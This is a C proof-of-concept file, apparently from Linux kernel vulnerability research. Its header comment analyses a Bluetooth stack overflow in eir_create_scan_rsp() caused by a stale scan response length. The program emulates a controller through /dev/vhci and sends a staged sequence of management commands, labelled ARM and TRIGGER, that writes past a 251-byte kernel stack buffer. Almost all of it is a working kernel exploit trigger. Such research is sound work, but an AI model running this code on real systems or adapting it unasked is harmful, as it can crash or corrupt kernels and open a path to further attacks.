/* Candidate C5: eir_create_scan_rsp() stack overflow via stale scan_rsp_len.
 *
 * net/bluetooth/eir.c:370 -- eir_create_scan_rsp() takes NO size parameter,
 * unlike its sibling eir_create_adv_data(hdev, instance, ptr, u8 size):
 *
 *      if ((adv->flags & MGMT_ADV_FLAG_APPEARANCE) && hdev->appearance)
 *              scan_rsp_len = eir_append_appearance(hdev, ptr, scan_rsp_len);  / * +4 * /
 *      memcpy(&ptr[scan_rsp_len], adv->scan_rsp_data, adv->scan_rsp_len);
 *
 * The destination is a 251-byte flexible array on the STACK
 * (net/bluetooth/hci_sync.c:1528):
 *      DEFINE_FLEX(struct hci_cp_le_set_ext_scan_rsp_data, pdu, data, length,
 *                  HCI_MAX_EXT_AD_LENGTH);
 * so 4 (appearance) + 251 (scan_rsp_len) writes 4 bytes past it.
 *
 * That combination is supposed to be impossible: tlv_data_max_len() subtracts 4
 * for MGMT_ADV_FLAG_APPEARANCE, so scan_rsp_len can only reach 251 when the
 * APPEARANCE flag is CLEAR. The bypass is that the two fields are set by
 * different commands and only one of them is reset:
 *
 *   hci_add_adv_instance() on an EXISTING instance (hci_core.c:1671,1699)
 *       memset(adv->scan_rsp_data, 0, ...);   / * clears the DATA * /
 *       adv->flags = flags;                   / * replaces the FLAGS * /
 *   hci_set_adv_instance_data() (hci_core.c:1771-1775)
 *       if (scan_rsp_len && ...) { ... adv->scan_rsp_len = scan_rsp_len; }
 *                                     ^ only assigned when NON-ZERO
 *
 * ADD_EXT_ADV_PARAMS passes scan_rsp_len = 0, so re-issuing it changes flags
 * while the previously validated length survives. grep confirms
 * adv->scan_rsp_len is assigned in exactly one place (hci_core.c:1774), so it
 * can never be reset to 0.
 *
 * Structurally identical to the verified enc_key_size bug: a validator runs
 * once at set time, and a later unvalidated write invalidates its conclusion.
 *
 * Requires CONFIG_KASAN_STACK=y to be observed -- the 4 bytes land in adjacent
 * stack slots, not on the canary, so STACKPROTECTOR alone will likely miss it.
 */
#include "common.h"
#include <sys/wait.h>

#define HCI_COMMAND_PKT 0x01
#define HCI_EVENT_PKT   0x04
#define HCI_VENDOR_PKT  0xff

#define AF_BLUETOOTH_   31
#define BTPROTO_HCI     1
#define HCI_CHANNEL_CONTROL 3
#define HCI_DEV_NONE    0xffff
#define HCIDEVUP        _IOW('H', 201, int)

#define MGMT_OP_SET_POWERED         0x0005
#define MGMT_OP_SET_LE              0x000D
#define MGMT_OP_SET_APPEARANCE      0x0043
#define MGMT_OP_ADD_EXT_ADV_PARAMS  0x0054
#define MGMT_OP_ADD_EXT_ADV_DATA    0x0055

#define MGMT_ADV_FLAG_APPEARANCE    (1u << 5)

struct sockaddr_hci {
	unsigned short hci_family;
	unsigned short hci_dev;
	unsigned short hci_channel;
};

static int vfd = -1;

static void vwrite(const unsigned char *b, int n)
{
	if (write(vfd, b, n) != n)
		logf("WARN: vhci write failed: %s", strerror(errno));
}

static void respond_cc(unsigned short opcode, const unsigned char *p, int plen)
{
	unsigned char ev[300];
	int n = 0;

	ev[n++] = HCI_EVENT_PKT;
	ev[n++] = 0x0e;
	ev[n++] = 0;
	ev[n++] = 1;
	ev[n++] = opcode & 0xff;
	ev[n++] = (opcode >> 8) & 0xff;
	ev[n++] = 0x00;
	if (plen > 0) { memcpy(ev + n, p, plen); n += plen; }
	ev[2] = n - 3;
	vwrite(ev, n);
}

static void responder_loop(void)
{
	unsigned char buf[4096], p[256];
	int n;

	for (;;) {
		n = read(vfd, buf, sizeof(buf));
		if (n < 0) {
			if (errno == EINTR || errno == EAGAIN) continue;
			_exit(0);
		}
		if (n < 4 || buf[0] != HCI_COMMAND_PKT) continue;
		{
			unsigned short op = buf[1] | (buf[2] << 8);

			memset(p, 0, sizeof(p));
			switch (op) {
			case 0x1003:            /* Read Local Features */
				p[4] = 0x40;    /* LMP_LE */
				p[6] = 0x20;    /* LMP_LE_BREDR */
				respond_cc(op, p, 8);
				break;
			case 0x1005:            /* Read Buffer Size */
				p[0] = 0xff; p[2] = 0x08; p[3] = 0x10; p[5] = 0x10;
				respond_cc(op, p, 7);
				break;
			case 0x1009:            /* Read BD Addr */
				p[0]=0x11; p[1]=0x22; p[2]=0x33; p[3]=0x44; p[4]=0x55; p[5]=0x66;
				respond_cc(op, p, 6);
				break;
			case 0x2002:            /* LE Read Buffer Size */
				p[0] = 0x1b; p[2] = 0x08;
				respond_cc(op, p, 3);
				break;
			case 0x2003:            /* LE Read Local Supported Features */
				/* le_features[1] |= HCI_LE_EXT_ADV so ext_adv_capable()
				 * is true and max_adv_len() becomes 251. */
				p[0] = 0x01;    /* LE Encryption */
				p[1] = 0x10;    /* HCI_LE_EXT_ADV */
				respond_cc(op, p, 8);
				break;
			case 0x203b:            /* LE Read Number of Supported Adv Sets */
				p[0] = 0x04;    /* must be non-zero or no instance can exist */
				respond_cc(op, p, 1);
				break;
			case 0x2036:            /* LE Set Ext Adv Params -> returns tx_power */
				p[0] = 0x00;
				respond_cc(op, p, 1);
				break;
			case 0x200f:
			case 0x202a:
				p[0] = 0x10;
				respond_cc(op, p, 1);
				break;
			default:
				respond_cc(op, p, 248);
				break;
			}
		}
	}
}

/* ---- mgmt ---------------------------------------------------------------- */
static int mfd = -1;
static unsigned short g_index;

static int mgmt_send(unsigned short op, const void *param, int plen)
{
	unsigned char msg[1024];
	int n = 0;

	msg[n++] = op & 0xff;      msg[n++] = op >> 8;
	msg[n++] = g_index & 0xff; msg[n++] = g_index >> 8;
	msg[n++] = plen & 0xff;    msg[n++] = plen >> 8;
	if (plen) { memcpy(msg + n, param, plen); n += plen; }

	if (write(mfd, msg, n) != n) {
		logf("  mgmt op 0x%04x write failed: %s", op, strerror(errno));
		return -1;
	}
	usleep(300000);
	return 0;
}

int main(void)
{
	int pid, i;
	struct sockaddr_hci sa;
	int hfd;

	logf("=== BT eir_create_scan_rsp stack OOB (C5) ===");

	vfd = open("/dev/vhci", O_RDWR);
	if (vfd < 0)
		die("open /dev/vhci");
	{ unsigned char c[2] = { HCI_VENDOR_PKT, 0x00 }; vwrite(c, 2); }
	sleep(1);

	pid = fork();
	if (pid == 0) { responder_loop(); _exit(0); }
	if (pid < 0) die("fork");
	sleep(1);

	hfd = socket(AF_BLUETOOTH_, SOCK_RAW, BTPROTO_HCI);
	if (hfd >= 0) {
		for (i = 0; i < 3; i++)
			if (ioctl(hfd, HCIDEVUP, i) == 0 || errno == EALREADY) {
				g_index = i;
				logf("hci%d up", i);
				break;
			}
	}
	sleep(1);

	mfd = socket(AF_BLUETOOTH_, SOCK_RAW, BTPROTO_HCI);
	if (mfd < 0) die("socket(mgmt)");
	memset(&sa, 0, sizeof(sa));
	sa.hci_family = AF_BLUETOOTH_;
	sa.hci_dev = HCI_DEV_NONE;
	sa.hci_channel = HCI_CHANNEL_CONTROL;
	if (bind(mfd, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		die("bind(mgmt)");
	logf("mgmt bound, index=%u", g_index);

	{
		unsigned char on = 1;
		unsigned char appearance[2] = { 0x80, 0x00 };   /* must be non-zero */
		unsigned char params[18];
		unsigned char data[8 + 260];
		int n;

		mgmt_send(MGMT_OP_SET_POWERED, &on, 1);
		mgmt_send(MGMT_OP_SET_LE, &on, 1);
		mgmt_send(MGMT_OP_SET_APPEARANCE, appearance, 2);
		logf("powered + LE + appearance set");

		/* 1. instance 1 with NO appearance flag -> tlv_data_max_len() is
		 *    the full 251, so a 251-byte scan response validates. */
		memset(params, 0, sizeof(params));
		params[0] = 1;                     /* instance */
		/* flags = 0 */
		mgmt_send(MGMT_OP_ADD_EXT_ADV_PARAMS, params, 18);
		logf("step1: ADD_EXT_ADV_PARAMS instance=1 flags=0");

		/* 2. install a 251-byte scan response (one well-formed AD element:
		 *    len=250, type=0xFF manufacturer specific, 249 payload). */
		memset(data, 0, sizeof(data));
		data[0] = 1;                       /* instance */
		data[1] = 0;                       /* adv_data_len */
		data[2] = 251;                     /* scan_rsp_len */
		data[3] = 250;                     /* AD element length */
		data[4] = 0xFF;                    /* AD type */
		memset(&data[5], 0x41, 249);
		n = 3 + 251;
		mgmt_send(MGMT_OP_ADD_EXT_ADV_DATA, data, n);
		logf("step2: ADD_EXT_ADV_DATA scan_rsp_len=251  (adv->scan_rsp_len=251)");

		/* 3. re-issue params for the SAME instance, now WITH the appearance
		 *    flag. flags are replaced; scan_rsp_len is not reset because
		 *    hci_set_adv_instance_data() only assigns it when non-zero. */
		memset(params, 0, sizeof(params));
		params[0] = 1;
		params[1] = MGMT_ADV_FLAG_APPEARANCE & 0xff;   /* flags, LE u32 */
		mgmt_send(MGMT_OP_ADD_EXT_ADV_PARAMS, params, 18);
		logf("step3: ADD_EXT_ADV_PARAMS instance=1 flags=APPEARANCE  <-- ARM");

		/* 4. any data update now re-runs the scan-rsp sync, which writes
		 *    4 + 251 bytes into the 251-byte stack buffer. */
		memset(data, 0, sizeof(data));
		data[0] = 1;
		data[1] = 0;
		data[2] = 0;
		logf("step4: ADD_EXT_ADV_DATA scan_rsp_len=0  <-- TRIGGER");
		mgmt_send(MGMT_OP_ADD_EXT_ADV_DATA, data, 3);

		sleep(2);
	}

	logf("sequence complete");
	if (pid > 0) { kill(pid, SIGKILL); waitpid(pid, NULL, 0); }
	return 0;
}
